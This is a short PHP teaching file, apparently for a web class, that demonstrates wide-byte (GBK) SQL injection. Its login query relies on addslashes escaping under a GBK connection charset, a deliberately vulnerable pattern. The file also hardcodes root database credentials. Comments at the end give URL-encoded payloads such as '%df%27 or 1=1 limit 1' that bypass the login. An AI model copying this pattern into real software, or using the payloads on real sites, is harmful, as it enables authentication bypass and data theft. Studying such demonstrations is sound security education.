<?php
/* 

Mysql command

查看编码：
SHOW VARIABLES LIKE 'character%'; 

 */ 


/*
 *  mysql 注入示例
 *
 * */
$db = new mysqli("localhost", "root", "123456", "webclass");
$uname = isset($_GET['uname']) ? $_GET['uname'] : '' ;
$password = isset($_GET['password']) ? $_GET['password'] : '';

if( !get_magic_quotes_gpc() )
{
    $uname = addslashes($uname);
    $password = addslashes($password);
}

//$db->query("set names gbk");

$charset = "set character_set_connection=gbk, character_set_results=gbk, character_set_client=binary";
$db->query($charset);

$sql = "select id,uname from user where uname = '{$uname}' and password = '{$password}'";

echo "<br/>".$sql."<br/>";
//echo $sql;

$result = $db->query($sql);


//echo $db->affected_rows;
//
//print_r( $result->fetch_assoc() );

if( $db->affected_rows > 0 )
{
    $row = $result->fetch_assoc();
//print_r($row);
    echo $row['uname']."登录成功！";

}else{
    echo "登录失败！";
}

/* %27: '
 *
 * */
//http://www.**.com/*.php?
//uname = %dc%27%20or%201=1%20
//limit%201%20/*&password=832823*/%23
 
//uname=%df%27%20or%201=1%20limit%201%20/*&password=832823*/%23




?>
